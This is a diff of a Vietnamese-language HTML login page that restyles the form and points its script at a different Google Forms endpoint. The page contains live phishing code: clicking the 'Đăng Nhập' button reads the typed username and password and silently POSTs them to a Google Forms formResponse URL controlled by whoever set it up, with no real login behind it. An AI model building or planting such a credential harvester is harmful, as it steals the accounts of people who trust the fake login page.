@@ -7,22 +7,25 @@
     <title>Document</title>
 </head>
 <body>
-    <form action="#">
-        <input id="username" type="text">
+
+    <div class="login">
+        <input class="info" id="username" type="text" placeholder="Tài khoản">
         <br>
-        <input id="password" type="password">
+        <input class="info" id="password" type="password" placeholder="Mật khẩu">
         <br>
+        <p id="rememberPassword"><input type="checkbox">Nhớ mật khẩu</p>
         <input id="submit" type="submit" value="Đăng Nhập">
-    </form>
+    </div>
+        
     <script>
         document.getElementById("submit").onclick = function(){
             var username = document.getElementById('username').value;
             var password = document.getElementById('password').value;
             var data  = new FormData();
-            data.set('entry.1136815632',username);
-            data.set('entry.2019635112',password);
+            data.set('entry.106239901',username);
+            data.set('entry.35463153',password);
             let request = new XMLHttpRequest();
-            var url = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSchWJfKPVsSxannAbiq1kxramKbv9K4DH-M4tjSJyBU5InTfg/formResponse";
+            var url = "https://docs.google.com/forms/u/0/d/e/1FAIpQLSdAqEZfA_zrt269vkWk1jA3_TkrvGa1NPM2hrahd6nKFuf4HQ/formResponse";
             request.open("POST", url, true);
             request.send(data);
         }
